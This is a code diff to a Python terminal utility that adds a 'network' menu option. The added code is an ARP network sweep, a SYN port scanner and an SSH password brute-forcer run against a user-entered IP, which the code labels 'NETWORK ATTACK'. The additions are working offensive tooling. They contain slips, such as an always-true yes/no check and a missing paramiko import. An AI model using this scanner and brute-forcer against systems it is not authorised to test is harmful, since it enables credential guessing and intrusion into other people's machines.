@@ -1,3 +1,4 @@
+from scapy.all import *
 import datetime
 import pandas as pd
 import plotext as plt
@@ -7,8 +8,110 @@ import mysql.connector
 from mysql.connector import Error
 from getpass import getpass
 from tabulate import tabulate
+from scapy.all import ARP, Ether, srp
+
+Registered_Ports = range(1, 1024)
+open_ports = []
+status = False
+
+#====================================================NETWORK SCAN==============================================
+
+def network_scan():
+    def scan(ip):
+        arp_request = ARP(pdst=ip)
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether / arp_request
+        result = srp(packet, timeout=3, verbose=0)[0]
+
+        devices = []
+        for sent, received in result:
+            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
+
+        return devices
+
+    ip_range = "192.168.50.0/24"
+    devices = scan(ip_range)
+
+    for device in devices:
+        print(f"IP: {device['ip']}, MAC: {device['mac']}")
 
 
+#====================================================NETWORK ATTACK==============================================
+
+
+def scanport(port):
+    conf.verb = 0
+    sport = RandShort()
+    global status
+    global open_ports
+    try:
+        SynPkt = sr1(IP(dst=target)/TCP(sport=sport, dport=port, flags="S"), timeout=0.5)
+        if SynPkt != None:
+            if SynPkt.haslayer(TCP):
+                if SynPkt.getlayer(TCP).flags == 0x12:
+                    print(port, ": Open")
+                    status = True
+                    open_ports.append(port)
+                else:
+                    return False
+        else:
+            print(port, ": Closed")
+            return False
+        sr(IP(dst=target) / TCP(sport=sport, dport=port, flags="R"), timeout=2)
+        return True
+    except Exception as e:
+        print("The error was :", e)
+        return False
+
+
+def icmp():
+    try:
+        conf.verb = 0
+        IcmpPkt = sr1(IP(dst=target) / ICMP(), timeout=3)
+        if IcmpPkt != None:
+            if IcmpPkt.haslayer(ICMP):
+                print(target, " ICMP ok")
+                return True
+        else:
+            print(target, " unreachable")
+    except Exception as e:
+        print("The error was :", e)
+
+def loop():
+    for port in Registered_Ports:
+        scanport(port)
+    print("Scan finished, open ports: ", open_ports)
+
+def bruteforce(port):
+    user = str(input("Enter username: "))
+    SSHconn = paramiko.SSHClient()
+    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        with (open('PasswordList.txt') as file):
+            passwords = file.read().splitlines()
+            for password in passwords:
+                if password != None:
+                    try:
+                        SSHconn.connect(target, port=port, username=user, password=password, timeout=1)
+                        print("Success, logged with password: ", password)
+                        SSHconn.close()
+                        break
+                    except:
+                        print(password, " failed")
+                    continue
+    except Exception as e:
+        print("ERROR: ", e)
+
+
+def network_attacker():
+    global target
+    target = str(input("Enter IP to attack: "))
+    if icmp():
+        loop()
+    if open_ports.__contains__(22):
+        answear = str(input("Do you want to bruteforce SSH? y/n? "))
+        if answear == "y" or "Y":
+            bruteforce(22)
 #====================================================CLOCK==============================================
 
 
@@ -272,9 +375,9 @@ def sql_db():
 def menu_display():
     show_time()
     print()
-    print("=" * 76)
-    print("|| 1.run database  2.run budget  3.calendar  4.currency converter  5.exit ||")
-    print("=" * 76)
+    print("=" * 87)
+    print("|| 1.run database  2.run budget  3.calendar  4.currency converter  5.network  6.exit ||")
+    print("=" * 87)
     print()
     choice = int(input("What do you want to do?: "))
     return choice
@@ -330,6 +433,12 @@ def terminal():
             print()
             currency_converter()
             print()
+        elif choice == 5:
+            choice = input("Scan network [1] or Attack an IP [2]: ")
+            if choice == '1':
+                network_scan()
+            else:
+                network_attacker()
         else:
             loop_menu = False
 
